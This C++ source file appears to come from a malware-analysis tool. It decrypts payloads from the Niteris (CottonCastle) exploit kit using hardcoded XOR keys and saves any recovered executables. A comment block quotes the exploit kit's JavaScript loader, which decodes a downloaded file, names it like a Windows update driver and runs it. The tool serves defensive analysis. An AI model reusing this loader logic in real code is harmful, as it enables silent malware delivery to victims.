#include "Includes.h"
#include "Utils.h"
#include <string>
#include <ctime>
#include "Niteris_CottonCastle.h"

/*
var g_lav = 'cc,bb';
var g_lwork = 1;
var g_ft = 1;
var g_ts = 0;
var g_uf = '/relax/nalogi/5/PYDRFKIP/5fead4b805bc468e6a4008be28c6ca6a';
var g_xk = '97dc6e7aaa9c089d0ed82ebfd9fca4fe';
var g_cb = '/sro/regions/';
var g_fn = 'Windows6.1-KB6928566-x86.drv';
var g_tca = 5000;
var g_av;
var g_path;
var g_pc = 0;
var g_avun = 0;
var g_run = 0;
var g_alive = 0;
var g_ulvl = 0;
var g_err = '0';
var g_runt = new Date().getTime();
var g_try = 2;
var g_tryd = 5;

// c= data
// p= filename
// k= key
// t= 0 (may be offset)
function SaveDecodedFile(c, p, k, t) {
	try {
		var file = CreateFile(p);
		if (!file) {
			return !1;
		}
		var byteMapping = {};
		for (var i = 0; i < 256; i++) {
			for (var j = 0; j < 256; j++) {
				byteMapping[String.fromCharCode(i + j * 256)] = String.fromCharCode(i) + String.fromCharCode(j);
			}
		};
		var getBytes = function (byteArray) {
			var rawBytes = ieRawBytes(byteArray),
			lastChr = ieLastChr(byteArray);
			return rawBytes.replace(/[\s\S]/g, function (match) {
				return byteMapping[match];
			}) + lastChr;
		};
		var bytes = getBytes(c),
		bytelen = bytes.length,
		keylen = k.length;
		var code,
		xor,
		key,
		output = [],
		j = 0;
		var timestamp_firstbyte,
		timestamp_position,
		timestamp_bytes = 4,
		timestamp_today = newTimeStamp();
		for (var i = 0; i < bytelen; i++) {
			code = bytes.charCodeAt(i);
			key = k.charCodeAt(i % keylen);
			xor = (code != 0 && code != key) ? code^key : code;
			if (t) {
				if (i == 60) {
					timestamp_firstbyte = xor;
				} else if (i == 61) {
					timestamp_position = (xor * 256 + timestamp_firstbyte) + 8;
				}
				if (0 < timestamp_bytes && 0 < timestamp_position && timestamp_position <= i) {
					timestamp_bytes--;
					xor = timestamp_today[timestamp_bytes];
				}
			}
			output[j++] = ((127 < xor) ? f_chr(xor) : String.fromCharCode(xor));
			if (j == 1024) {
				file.Write(output.join(''));
				output = [];
				j = 0;
			}
		}
		file.Write(output.join(''));
		file.Close();
		return !0;
	} catch (e) {
		g_err += 'j' + (e.number & 0xFFFF);
		return !1;
	}
	return !0;
}

function checkCompleteDownload() {
	if (amx.readyState == 4 && amx.status == 200) {
		if (SaveDecodedFile(amx.responseBody, g_fn, g_xk, g_ts)) {
			amx.abort();
			runSoft();
		} else {
			f_close();
		}
	}
}

*/

unsigned char Niteris_CottonCastlekeys[][33]= {"97dc6e7aaa9c089d0ed82ebfd9fca4fe",
	                                           "e2400a24ac76b37cb0adff1dfd022e08",
											   "b75af393686497fa40449c735a88e304",
											   "55964cdef0e79a639a17c1802c31b6be"
                                              };

static void decryptme(unsigned int keyIndex, char *buffer, long bSize, bool newmethod)
{
	unsigned char keylen= strlen((const char*)&Niteris_CottonCastlekeys[keyIndex][0]);
	for (int i = 0; i < bSize; i++) {
		if (newmethod)
			buffer[i] = (buffer[i] != 0 && buffer[i] != Niteris_CottonCastlekeys[keyIndex][i % keylen]) ? buffer[i]^Niteris_CottonCastlekeys[keyIndex][i % keylen] : buffer[i];
		else
			buffer[i] = buffer[i]^Niteris_CottonCastlekeys[keyIndex][i % keylen];
	}
}

bool DecryptNiteris_CottonCastle_EK_HBinary(const unsigned char *buffer, unsigned int bSize)
{
	unsigned char *buffernew= NULL;
	std::string filename;
	FILE *fout=NULL;
	unsigned long writenCount= 0;
	bool foundBinary= false;
	unsigned int keyindex= 0;
	bool newmethod= true;

	printf("[INFO] Niteris (CottonCastle) EK: Decrypting buffer of size: %d\n", bSize);

	for(int _me=0; _me < 2; _me++){ // TODO: Need some more improvement.
		while (!foundBinary && keyindex < _countof(Niteris_CottonCastlekeys)){

			printf("[INFO] Niteris (CottonCastle) EK: Key size: %d\n", strlen((const char*)&Niteris_CottonCastlekeys[keyindex][0]));
			printhex(&Niteris_CottonCastlekeys[keyindex][0], strlen((const char*)&Niteris_CottonCastlekeys[keyindex][0]));

			buffernew= (unsigned char*)calloc(1,bSize+1);
			if (!buffernew){
				printf("[ERROR] Niteris (CottonCastle) EK: Error in allocating memory\n");
				return false;
			}

			memcpy(buffernew, buffer, bSize);
			decryptme(keyindex, (char *)buffernew,bSize, newmethod);

			if(isitaPEbinary(buffernew, bSize)){
				std::string randstr= std::to_string((long long)rand() % 1000 + 1);
				
				filename= "Niteris_CottonCastle_" + randstr +".bin";
			
				fout = fopen ( filename.c_str() , "wb" );
				if( !fout ) {
					perror("[ERROR]: Niteris (CottonCastle) EK: Error Opening file for writting\n");
					free(buffernew);
					return false;
				}

				writenCount= fwrite(buffernew, bSize, 1, fout);
				if( writenCount != 1){
					perror("[ERROR]: Niteris (CottonCastle) EK: Error in writting the full content\n");
					free(buffernew);
					return false;
				}

				fclose(fout);
				printf("[INFO] Found an Niteris (CottonCastle) EK encrypted binary\n");
				foundBinary= true;
			}

			free(buffernew);
			keyindex++;
		}

		newmethod= !newmethod;
	}
	return foundBinary;
}
